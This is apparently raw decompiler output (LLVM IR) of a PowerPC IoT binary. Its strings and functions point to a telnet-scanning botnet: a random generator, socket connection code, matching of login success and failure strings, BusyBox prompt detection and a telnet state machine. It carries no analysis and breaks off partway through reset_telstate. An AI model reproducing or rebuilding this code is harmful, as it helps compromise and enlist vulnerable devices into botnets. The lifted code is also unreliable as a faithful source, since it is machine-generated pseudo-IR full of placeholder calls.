@global_var_1000fbf8.781 = constant i32 939524130
@global_var_1002b854.782 = global i32 0
@global_var_1002b93c.783 = local_unnamed_addr global i32 0
@global_var_1000fc8c.784 = constant i32 1207960361
@global_var_1002b944.785 = local_unnamed_addr global i32 0
@global_var_1002b000.786 = global i32 -1
@global_var_1002b94c.787 = local_unnamed_addr global i32 0
@global_var_1002b950.788 = local_unnamed_addr global i32 0
@global_var_1001a12c.789 = constant [10 x i8] c"/dev/null\00"
@global_var_1002b954.790 = local_unnamed_addr global i32 0
@global_var_1002b940.791 = local_unnamed_addr global i32 0
@global_var_10010360.792 = constant i32 939524096
@global_var_1001037c.793 = constant i32 939524096
@global_var_1002b978.794 = local_unnamed_addr global i32 0
@global_var_1002b95c.795 = global i32 0
@global_var_100106f0.796 = constant i32 939524180
@global_var_10010a8c.797 = constant i32 939524105
@global_var_1001a460.798 = constant [4 x i8] c"inf\00"
@global_var_1001a463.800 = constant i32 4804166
@global_var_1001a470.801 = constant i32 771763200
@global_var_10031ba0.803 = global i32 0
@global_var_1002b960.804 = local_unnamed_addr global i32 0
@global_var_100119b8.806 = constant i32 1207960848
@global_var_1002b968.807 = local_unnamed_addr global i32 0
@global_var_1001a4c0.808 = constant i32 771751936
@global_var_10031c50.809 = global i32 0
@global_var_10011aa8.810 = constant [3 x i8] c"8a\00"
@global_var_10011ab4.811 = constant i32 939524097
@global_var_10011b88.812 = constant i32 939524097
@global_var_10011c5c.813 = constant i32 939524097
@global_var_10011c88.814 = constant i32 939524100
@global_var_10011d68.815 = constant i32 1207959684
@global_var_10011ee4.816 = constant i32 939589631
@global_var_1001a4dc.817 = constant i32 1912602624
@global_var_1001a4c8.818 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001a4e0.819 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001a4f8.820 = constant [11 x i8] c"nameserver\00"
@global_var_1001a504.821 = constant [7 x i8] c"domain\00"
@global_var_1001a50c.822 = constant [7 x i8] c"search\00"
@global_var_1001221c.823 = constant i32 1207959568
@global_var_10012224.824 = constant i32 939524099
@global_var_1002b888.825 = global i32 0
@global_var_10012384.826 = constant i32 939524129
@global_var_1002b96c.827 = local_unnamed_addr global i32 0
@global_var_100123f8.828 = constant [3 x i8] c"8`\00"
@global_var_10012430.829 = constant i32 939524129
@global_var_1002b970.830 = local_unnamed_addr global i32 0
@global_var_1002b974.831 = local_unnamed_addr global i32 0
@global_var_1002b930.832 = local_unnamed_addr global i32 0
@global_var_100126c8.834 = constant i32 1207961081
@global_var_100128f0.835 = constant i32 939524171
@global_var_10012980.836 = constant i32 1207960120
@global_var_1002b8e4.837 = local_unnamed_addr global i32 2
@global_var_10012bb4.838 = constant i32 1207959560
@global_var_10012e94.839 = constant i32 1207959708
@global_var_10012f3c.840 = constant i32 1207959612
@global_var_10013334.841 = constant [3 x i8] c"8`\00"
@global_var_1001a528.842 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1001352c.843 = constant [3 x i8] c"9 \00"
@global_var_10013538.844 = constant i32 939524193
@global_var_100135a0.846 = constant i32 939524101
@global_var_1001368c.847 = constant i32 939524124
@global_var_10013704.848 = constant i32 1207960116
@global_var_1001371c.849 = constant i32 939524105
@global_var_10013894.850 = constant [3 x i8] c"9 \00"
@global_var_1001a53c.851 = constant [3 x i8] c"%x\00"
@global_var_10013920.852 = constant i32 939524124
@global_var_10013944.853 = constant i32 939524193
@global_var_1001a540.854 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001a54c.855 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10014030.856 = constant i32 1207959560
@global_var_100140c8.857 = constant i32 939589631
@global_var_100145ac.858 = constant i32 939524105
@global_var_1002b004.859 = global i32 0
@global_var_1002b97c.2 = local_unnamed_addr global i8 0
@2 = internal constant [2 x i8] c"$\00"
@3 = internal constant [2 x i8] c"#\00"
@4 = internal constant [8 x i8] c"BusyBox\00"
@5 = internal constant [4 x i8] c"Box\00"
@6 = internal constant [6 x i8] c"shell\00"
@7 = internal constant [2 x i8] c"l\00"
@8 = internal constant [7 x i8] c"dvrdvs\00"
@9 = internal constant [3 x i8] c"vs\00"
@10 = internal constant [7 x i8] c"Kakuta\00"
@11 = internal constant [3 x i8] c"ta\00"
@global_var_10014918.15 = constant [10 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @6, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @11, i32 0, i32 0)]
@global_var_1002b913.60 = local_unnamed_addr global i8 0
@global_var_1002b914.61 = local_unnamed_addr global i8 0
@global_var_1002b5a4.705 = global i16 288
@global_var_1002b5f4.706 = local_unnamed_addr global i16 272
@global_var_1002b934.833 = local_unnamed_addr global i16* null
@global_var_1002b86c.805 = local_unnamed_addr global i16 1
@global_var_10018e24.696 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002b97c.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002b97c.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002b97c.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002b010.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002b010.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268482064, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268519036, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268436072, i32* @lr, align 4
  %v1_10000264 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10000274 = icmp eq i32 %v1_10000264, 0
  br i1 %v3_10000274, label %dec_label_pc_1000027c, label %dec_label_pc_10000288

dec_label_pc_1000027c:                            ; preds = %entry
  br label %dec_label_pc_10000360

dec_label_pc_10000288:                            ; preds = %entry
  %v1_1000028c = add i32 %v1_10000264, 16
  %v2_1000028c = inttoptr i32 %v1_1000028c to i32*
  %v3_1000028c = load i32, i32* %v2_1000028c, align 4
  %v1_10000290 = inttoptr i32 %v3_1000028c to i32*
  %v2_10000290 = load i32, i32* %v1_10000290, align 4
  %v1_10000298 = add i32 %v1_10000264, 12
  %v2_10000298 = inttoptr i32 %v1_10000298 to i32*
  %v3_10000298 = load i32, i32* %v2_10000298, align 4
  %v2_100002a0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_100002a4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10000298, i32* @r5, align 4
  store i32 268436152, i32* @lr, align 4
  %v4_100002b4 = call i32 @bcopy(i32 %v2_10000290, i32 %v2_100002a4, i32 %v3_10000298, i32 %v2_100002a0)
  %v4_100002b8 = zext i16 %arg2 to i32
  store i32 %v4_100002b8, i32* @r3, align 4
  %v1_100002c4 = call i32 @htons(i32 %v4_100002b8)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268436200, i32* @lr, align 4
  %v3_100002e4 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_100002f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268436236, i32* @lr, align 4
  %v5_10000308 = call i32 @__GI_setsockopt(i32 %v3_100002e4, i32 6, i32 1, i32 %v2_100002f0, i32 4)
  %v4_10000314 = icmp eq i32 %v3_100002e4, -1
  br i1 %v4_10000314, label %dec_label_pc_1000031c, label %dec_label_pc_10000328

dec_label_pc_1000031c:                            ; preds = %dec_label_pc_10000288
  br label %dec_label_pc_10000360

dec_label_pc_10000328:                            ; preds = %dec_label_pc_10000288
  store i32 268436284, i32* @lr, align 4
  %v3_10000338 = call i32 @__libc_connect(i32 %v3_100002e4, i32 %v2_100002a0, i32 16)
  %v4_10000344 = icmp eq i32 %v3_10000338, -1
  br i1 %v4_10000344, label %dec_label_pc_1000034c, label %dec_label_pc_10000358

dec_label_pc_1000034c:                            ; preds = %dec_label_pc_10000328
  br label %dec_label_pc_10000360

dec_label_pc_10000358:                            ; preds = %dec_label_pc_10000328
  br label %dec_label_pc_10000360

dec_label_pc_10000360:                            ; preds = %dec_label_pc_1000034c, %dec_label_pc_1000031c, %dec_label_pc_1000027c, %dec_label_pc_10000358
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000027c ], [ 0, %dec_label_pc_1000031c ], [ 0, %dec_label_pc_1000034c ], [ %v3_100002e4, %dec_label_pc_10000358 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_100002a0, { 1, 0 }
  uselistorder i32 %v3_10000298, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10000360, { 3, 0, 1, 2 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002b998.9, align 4
  %v1_100003a8 = add i32 %arg1, -1640531527
  store i32 %v1_100003a8, i32* @global_var_1002b99c.10, align 4
  %v1_100003c0 = add i32 %arg1, 1013904242
  store i32 %v1_100003c0, i32* @global_var_1002b9a0.11, align 4
  br label %dec_label_pc_100003dc

dec_label_pc_100003dc:                            ; preds = %entry, %dec_label_pc_100003dc
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_10000444, %dec_label_pc_100003dc ]
  %v1_100003e4 = mul i32 %storemerge12, 4
  %v2_100003f4 = add i32 %v1_100003e4, add (i32 ptrtoint (i32* @global_var_1002b998.9 to i32), i32 -12)
  %v1_100003f8 = inttoptr i32 %v2_100003f4 to i32*
  %v2_100003f8 = load i32, i32* %v1_100003f8, align 4
  %v2_10000410 = add i32 %v1_100003e4, add (i32 ptrtoint (i32* @global_var_1002b998.9 to i32), i32 -8)
  %v1_10000414 = inttoptr i32 %v2_10000410 to i32*
  %v2_10000414 = load i32, i32* %v1_10000414, align 4
  %v2_10000418 = xor i32 %storemerge12, -1640531527
  %v2_10000420 = xor i32 %v2_10000418, %v2_100003f8
  %v1_10000428 = xor i32 %v2_10000420, %v2_10000414
  %v2_10000438 = add i32 %v1_100003e4, ptrtoint (i32* @global_var_1002b998.9 to i32)
  %v2_1000043c = inttoptr i32 %v2_10000438 to i32*
  store i32 %v1_10000428, i32* %v2_1000043c, align 4
  %v1_10000444 = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_10000444, 4096
  br i1 %tmp7, label %dec_label_pc_100003dc, label %dec_label_pc_10000458

dec_label_pc_10000458:                            ; preds = %dec_label_pc_100003dc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100003e4, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100003dc, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000490 = load i32, i32* @global_var_1002b570.12, align 4
  %v1_10000494 = add i32 %v3_10000490, 1
  %v1_10000498 = urem i32 %v1_10000494, 4096
  store i32 %v1_10000498, i32* @global_var_1002b570.12, align 4
  %v1_100004b4 = mul nuw nsw i32 %v1_10000498, 4
  %v2_100004b8 = add i32 %v1_100004b4, ptrtoint (i32* @global_var_1002b998.9 to i32)
  %v1_100004bc = inttoptr i32 %v2_100004b8 to i32*
  %v2_100004bc = load i32, i32* %v1_100004bc, align 4
  %v6_100004e0 = udiv i32 %v2_100004bc, 228675
  %v2_100004e4 = mul i32 %v2_100004bc, 18782
  %v3_100004f4 = load i32, i32* @global_var_1002b56c.13, align 4
  %v2_10000500 = add i32 %v3_100004f4, %v2_100004e4
  %v3_10000500 = icmp ult i32 %v2_10000500, %v3_100004f4
  %v4_10000504 = zext i1 %v3_10000500 to i32
  %v5_10000504 = add nuw nsw i32 %v4_10000504, %v6_100004e0
  store i32 %v5_10000504, i32* %r10.global-to-local, align 4
  %v2_10000534 = add i32 %v5_10000504, %v2_10000500
  %v2_10000548 = icmp ult i32 %v2_10000534, %v5_10000504
  br i1 %v2_10000548, label %dec_label_pc_10000550, label %dec_label_pc_10000570

dec_label_pc_10000550:                            ; preds = %entry
  %v1_10000554 = add i32 %v2_10000534, 1
  %v1_10000564 = add nuw nsw i32 %v5_10000504, 1
  br label %dec_label_pc_10000570

dec_label_pc_10000570:                            ; preds = %entry, %dec_label_pc_10000550
  %storemerge = phi i32 [ %v1_10000564, %dec_label_pc_10000550 ], [ %v5_10000504, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_10000554, %dec_label_pc_10000550 ], [ %v2_10000534, %entry ]
  store i32 %storemerge, i32* @global_var_1002b56c.13, align 4
  store i32 %v1_10000498, i32* %r10.global-to-local, align 4
  %v2_10000580 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000580, i32* %v1_100004bc, align 4
  %v0_100005a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100005a0 = mul i32 %v0_100005a0, 4
  %v2_100005a4 = add i32 %v1_100005a0, ptrtoint (i32* @global_var_1002b998.9 to i32)
  %v1_100005a8 = inttoptr i32 %v2_100005a4 to i32*
  %v2_100005a8 = load i32, i32* %v1_100005a8, align 4
  ret i32 %v2_100005a8

; uselistorder directives
  uselistorder i32 %v5_10000504, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100004f4, { 1, 0 }
  uselistorder i32 %v2_100004bc, { 1, 0 }
  uselistorder i32 %v1_10000498, { 2, 0, 1 }
  uselistorder i32* @global_var_1002b998.9, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b998.9 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000570, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_100005f4

dec_label_pc_100005f4:                            ; preds = %dec_label_pc_100005f4, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100005f8, %dec_label_pc_100005f4 ]
  %v1_100005f8 = add i32 %stack_var_-36.0, 1
  %v1_10000604 = mul i32 %v1_100005f8, 4
  %v2_10000610 = add i32 %v1_10000604, %arg2
  %v1_10000614 = inttoptr i32 %v2_10000610 to i32*
  %v2_10000614 = load i32, i32* %v1_10000614, align 4
  %v3_10000618 = icmp eq i32 %v2_10000614, 0
  br i1 %v3_10000618, label %dec_label_pc_10000678.preheader, label %dec_label_pc_100005f4

dec_label_pc_10000678.preheader:                  ; preds = %dec_label_pc_100005f4
  %v2_100006804 = icmp sgt i32 %v1_100005f8, 0
  br i1 %v2_100006804, label %dec_label_pc_1000062c.lr.ph, label %dec_label_pc_10000690

dec_label_pc_1000062c.lr.ph:                      ; preds = %dec_label_pc_10000678.preheader
  %v3_10000650 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_1000062c

dec_label_pc_1000062c:                            ; preds = %dec_label_pc_1000062c.lr.ph, %dec_label_pc_1000066c
  %storemerge27 = phi i32 [ 0, %dec_label_pc_1000062c.lr.ph ], [ %v1_10000670, %dec_label_pc_1000066c ]
  %v1_10000630 = mul i32 %storemerge27, 4
  %v2_1000063c = add i32 %v1_10000630, %arg2
  %v1_10000640 = inttoptr i32 %v2_1000063c to i32*
  %v2_10000640 = load i32, i32* %v1_10000640, align 4
  store i32 268437076, i32* @lr, align 4
  %v4_10000650 = call i32 @strcasestr(i8* %v3_10000650, i32 %v2_10000640, i32 %v2_1000063c)
  %v3_10000658 = icmp eq i32 %v4_10000650, 0
  br i1 %v3_10000658, label %dec_label_pc_1000066c, label %dec_label_pc_10000690.loopexit

dec_label_pc_1000066c:                            ; preds = %dec_label_pc_1000062c
  %v1_10000670 = add nuw nsw i32 %storemerge27, 1
  %v2_10000680 = icmp slt i32 %v1_10000670, %v1_100005f8
  br i1 %v2_10000680, label %dec_label_pc_1000062c, label %dec_label_pc_10000690.loopexit

dec_label_pc_10000690.loopexit:                   ; preds = %dec_label_pc_1000066c, %dec_label_pc_1000062c
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_1000062c ], [ 0, %dec_label_pc_1000066c ]
  br label %dec_label_pc_10000690

dec_label_pc_10000690:                            ; preds = %dec_label_pc_10000690.loopexit, %dec_label_pc_10000678.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10000678.preheader ], [ %storemerge.ph, %dec_label_pc_10000690.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_100005f8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000062c, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100006d4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([5 x i8*]* @global_var_1002b0b8.19 to i32))
  ret i32 %v3_100006d4
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000071c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002b098.27 to i32))
  ret i32 %v3_1000071c
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268437344, i32* @lr, align 4
  %v1_1000075c = call i32 @contains_success(i32 %arg1)
  %v3_10000764 = icmp eq i32 %v1_1000075c, 0
  br i1 %v3_10000764, label %dec_label_pc_1000076c, label %dec_label_pc_10000794

dec_label_pc_1000076c:                            ; preds = %entry
  store i32 268437364, i32* @lr, align 4
  %v1_10000770 = call i32 @contains_fail(i32 %arg1)
  %v3_10000778 = icmp ne i32 %v1_10000770, 0
  %. = zext i1 %v3_10000778 to i32
  br label %dec_label_pc_10000794

dec_label_pc_10000794:                            ; preds = %dec_label_pc_1000076c, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_1000076c ]
  ret i32 %storemerge
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_100007e8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_100007e8, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge

dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge: ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge, %entry
  %v3_10000800.pre = phi i32 [ %v2_100007e8, %entry ], [ %v3_10000800.pre.pre, %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge ]
  %v1_1000081821 = phi i32 [ 1, %entry ], [ %v1_10000818, %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge ]
  %v1_10000804 = mul nuw nsw i32 %v1_1000081821, 4
  %v2_10000808 = add i32 %v1_10000804, %v3_10000800.pre
  %v2_10000810 = inttoptr i32 %v2_10000808 to i32*
  store i32 0, i32* %v2_10000810, align 4
  %v1_10000818 = add nuw nsw i32 %v1_1000081821, 1
  %tmp19 = icmp ult i32 %v1_10000818, 32
  br i1 %tmp19, label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge, label %dec_label_pc_1000082c

dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge: ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge
  %v3_10000800.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge

dec_label_pc_1000082c:                            ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge
  %v1_10000830 = udiv i32 %arg1, 32
  %v1_10000838 = mul nuw nsw i32 %v1_10000830, 4
  %v2_1000083c = ptrtoint i32* %stack_var_-184 to i32
  %v2_10000840 = add nuw nsw i32 %v1_10000838, 8
  %v1_10000844 = add i32 %v2_10000840, %v2_1000083c
  %v1_10000848 = inttoptr i32 %v1_10000844 to i32*
  %v2_10000848 = load i32, i32* %v1_10000848, align 4
  %v1_10000850 = urem i32 %arg1, 32
  %v3_10000858 = shl i32 1, %v1_10000850
  %v2_1000085c = or i32 %v2_10000848, %v3_10000858
  store i32 %v2_1000085c, i32* %v1_10000848, align 4
  %v1_10000878 = add i32 %arg1, 1
  %v2_10000880 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268437660, i32* @lr, align 4
  %v5_10000898 = call i32 @__libc_select(i32 %v1_10000878, i32 %v2_100007e8, i32 0, i32 0, i32 %v2_10000880)
  %v2_100008a0 = icmp sgt i32 %v5_10000898, 0
  br i1 %v2_100008a0, label %dec_label_pc_100008b4, label %dec_label_pc_100008d4

dec_label_pc_100008b4:                            ; preds = %dec_label_pc_1000082c
  store i32 268437708, i32* @lr, align 4
  %v4_100008c8 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_100008d4

dec_label_pc_100008d4:                            ; preds = %dec_label_pc_1000082c, %dec_label_pc_100008b4
  %storemerge = phi i32 [ %v4_100008c8, %dec_label_pc_100008b4 ], [ 0, %dec_label_pc_1000082c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10000818, { 1, 0 }
  uselistorder i32 %v2_100007e8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_100008d4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268437812, i32* @lr, align 4
  %v4_10000930 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10000944 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10000954 = load i8, i8* %arg3, align 1
  %v3_1000095c = icmp eq i8 %v3_10000954, -1
  br i1 %v3_1000095c, label %dec_label_pc_10000964, label %dec_label_pc_10000978

dec_label_pc_10000964:                            ; preds = %entry
  store i32 268437880, i32* @lr, align 4
  %v6_10000974 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10000978

dec_label_pc_10000978:                            ; preds = %entry, %dec_label_pc_10000964
  %v3_10000980 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10000988 = icmp ne i32 %v3_10000980, 0
  %. = zext i1 %v3_10000988 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10000978, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_100009e0 = add i32 %arg1, 4
  %v2_100009e0 = inttoptr i32 %v1_100009e0 to i32*
  %v3_100009e0 = load i32, i32* %v2_100009e0, align 4
  store i32 %v3_100009e0, i32* %stack_var_-20, align 4
  store i32 268438012, i32* @lr, align 4
  %v3_100009f8 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_100009f8
}

define i32 @advance_telstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10000a3c = icmp eq i32 %arg2, 0
  br i1 %v3_10000a3c, label %dec_label_pc_10000a44, label %dec_label_pc_10000a54

dec_label_pc_10000a44:                            ; preds = %entry
  %v2_10000a48 = load i32, i32* %arg1, align 4
  store i32 268438100, i32* @lr, align 4
  %v1_10000a50 = call i32 @__libc_close(i32 %v2_10000a48)
  br label %dec_label_pc_10000a54

dec_label_pc_10000a54:                            ; preds = %entry, %dec_label_pc_10000a44
  %v2_10000a5c = add i32 %tmp, 16
  %v3_10000a5c = inttoptr i32 %v2_10000a5c to i32*
  store i32 0, i32* %v3_10000a5c, align 4
  %v1_10000a6c = trunc i32 %arg2 to i8
  %v3_10000a6c = add i32 %tmp, 8
  %v4_10000a6c = inttoptr i32 %v3_10000a6c to i8*
  store i8 %v1_10000a6c, i8* %v4_10000a6c, align 1
  %v1_10000a74 = add i32 %tmp, 24
  %v2_10000a74 = inttoptr i32 %v1_10000a74 to i32*
  %v3_10000a74 = load i32, i32* %v2_10000a74, align 4
  store i32 268438156, i32* @lr, align 4
  %v3_10000a88 = call i32 @__GI_memset(i32 %v3_10000a74, i32 0, i32 1024)
  ret i32 %v3_10000a88

; uselistorder directives
  uselistorder label %dec_label_pc_10000a54, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10000ac4 = inttoptr i32 %arg1 to i32*
